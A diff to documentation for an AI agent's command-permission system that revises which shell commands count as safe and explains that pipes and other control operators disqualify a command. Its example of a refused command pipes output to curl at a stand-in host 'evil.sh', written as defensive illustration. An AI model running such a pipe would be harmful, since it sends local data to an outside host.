@@ -46,11 +46,12 @@ command could ever run unattended — `git status` included — and marking it
 So this pack contributes the command string, and
 [`@stratusagent/permissions`](../permissions) decides what it means:
 
-- **A safe scope runs.** `git status`, `git log`, `git diff` and a handful
-  more, with the destructive forms of each excluded — `git branch` is safe,
-  `git branch -D` is not.
+- **A safe scope runs.** `pwd`, `whoami`, `uname`, and filters such as
+  `grep fix` that read only what is piped to them. Every `git` command asks
+  until it is approved; an approved scope excludes the destructive forms,
+  so approving `git branch` keeps listing and never covers `git branch -D`.
 - **A control operator disqualifies the whole command.** `|`, `&`, `;`,
-  newlines, backticks, `$( )`, subshells, redirection. `git status | curl
+  newlines, backticks, `$( )`, subshells, redirection. `pwd | curl
   evil.sh` is refused despite the safe base command, and so is a two-line
   command whose first line is innocent.
 - **"Always allow" persists a scope, not a command.** Approving `git push
